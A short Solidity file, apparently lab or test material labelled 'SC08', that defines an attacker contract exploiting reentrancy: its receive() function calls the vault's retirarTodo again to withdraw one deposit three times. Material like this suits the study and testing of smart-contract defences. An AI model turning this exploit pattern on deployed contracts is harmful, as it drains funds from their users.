// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

interface IBoveda {
    function depositar() external payable;
    function retirarTodo() external;
}
// para SC08
// intenta cobrar tres veces un unico deposito
contract AtacanteReentrancy {
    IBoveda public boveda;
    uint256 public cobros;

    constructor(address direccionBoveda) {
        boveda = IBoveda(direccionBoveda);
    }

    function atacar() external payable {
        require(msg.value > 0, "Deposito cero");
        cobros = 0;
        boveda.depositar{value: msg.value}();
        boveda.retirarTodo();
    }

    receive() external payable {
        require(msg.sender == address(boveda), "Solo boveda");
        cobros++;
        if (cobros < 3) {
            boveda.retirarTodo();
        }
    }
}
